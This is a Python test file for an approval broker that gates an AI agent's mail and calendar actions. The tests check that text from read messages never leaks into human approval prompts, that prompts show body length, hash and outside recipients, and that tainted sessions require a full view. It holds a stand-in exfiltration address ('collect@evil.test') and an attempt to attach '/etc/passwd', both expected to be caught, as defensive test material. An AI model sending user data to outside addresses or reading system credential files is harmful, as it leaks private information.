import inspect

from broker.approvals.base import ApprovalOutcome, render_prompt
from broker.config import BrokerConfig
from broker.gate import Args, Decision, approval_request, prompt_fields
from broker.rules.models import Verdict
from broker.taint import Session
from tests.conftest import WorldFactory, fixture_texts

EXFIL = "collect@evil.test"


def test_prompt_builder_cannot_receive_message_objects() -> None:
    """The builder's inputs are typed: agent args, session counters, the decision, config."""
    allowed = {Session, Args, Decision, BrokerConfig}
    for param in inspect.signature(approval_request).parameters.values():
        assert param.annotation in allowed, param
    for param in inspect.signature(prompt_fields).parameters.values():
        assert param.annotation is Args, param


def test_no_message_text_reaches_any_prompt(world: WorldFactory) -> None:
    """Read everything in the fixture, then ask for approval: no inbound text in the prompt."""
    w = world()
    w.call("search_mail", limit=50)
    for message in w.backend.messages:
        w.call("read_message", message_id=message.id)
    w.call("list_events")
    w.call("send_mail", to=[EXFIL], subject="Status", body="Numbers attached.")
    w.call("create_event", title="Sync", start="s", end="e", attendees=[EXFIL])
    assert len(w.approver.requests) == 2
    inbound = [t for t in fixture_texts() if len(t) >= 8]
    for req in w.approver.requests:
        shown = render_prompt(req) + req.full_body
        for text in inbound:
            assert text not in shown, text[:40]


def test_prompt_shows_length_cut_and_hash(world: WorldFactory) -> None:
    w = world()
    body = "a" * 1234
    w.call("send_mail", to=["alice@work.test"], subject="s", body=body)
    req = w.approver.requests[0]
    text = render_prompt(req)
    assert req.body_length == 1234
    assert "1234 chars" in text
    assert "[+1034 more characters not shown]" in text
    assert req.body_sha256 in text


def test_short_body_has_no_cut_marker(world: WorldFactory) -> None:
    w = world()
    w.call("send_mail", to=["alice@work.test"], subject="s", body="short")
    assert "more characters" not in render_prompt(w.approver.requests[0])


def test_same_body_same_hash_different_body_different_hash(world: WorldFactory) -> None:
    w = world()
    for body in ("one", "one", "two"):
        w.call("send_mail", to=["alice@work.test"], subject="s", body=body)
    a, b, c = (r.body_sha256 for r in w.approver.requests)
    assert a == b != c


def test_full_view_needed_only_when_tainted_and_long(world: WorldFactory) -> None:
    w = world(default=ApprovalOutcome.APPROVED)
    long_body = "z" * 2001
    assert w.call("send_mail", to=["alice@work.test"], subject="s", body=long_body).ok
    assert not w.approver.requests[-1].requires_full_view
    w.call("read_message", message_id="m_forward")
    result = w.call("send_mail", to=["alice@work.test"], subject="s", body=long_body)
    assert w.approver.requests[-1].requires_full_view
    assert result.approval == ApprovalOutcome.UNVIEWED
    w.approver.views_full_body = True
    assert w.call("send_mail", to=["alice@work.test"], subject="s", body=long_body).ok


def test_full_view_needed_after_approval_threshold(world: WorldFactory) -> None:
    w = world(default=ApprovalOutcome.APPROVED)
    for _ in range(10):
        w.call("send_mail", to=["alice@work.test"], subject="s", body="b")
    assert not any(r.requires_full_view for r in w.approver.requests)
    w.call("send_mail", to=["alice@work.test"], subject="s", body="b")
    assert w.approver.requests[-1].requires_full_view
    assert w.approver.requests[-1].approval_number == 11


def test_new_and_outside_recipients_marked(world: WorldFactory) -> None:
    w = world(default=ApprovalOutcome.APPROVED)
    w.call("send_mail", to=["alice@work.test", EXFIL], subject="s", body="b")
    first = w.approver.requests[-1]
    assert first.new_recipients == ["alice@work.test", EXFIL]
    assert first.outside_recipients == [EXFIL]
    w.call("send_mail", to=["alice@work.test"], subject="s", body="b")
    assert w.approver.requests[-1].new_recipients == []


def test_attachments_argument_denied(world: WorldFactory) -> None:
    w = world(default=ApprovalOutcome.APPROVED)
    result = w.call(
        "send_mail", to=["alice@work.test"], subject="s", body="b", attachments=["/etc/passwd"]
    )
    assert result.verdict == Verdict.DENY
    assert w.approver.requests == []
    assert w.backend.sent == []
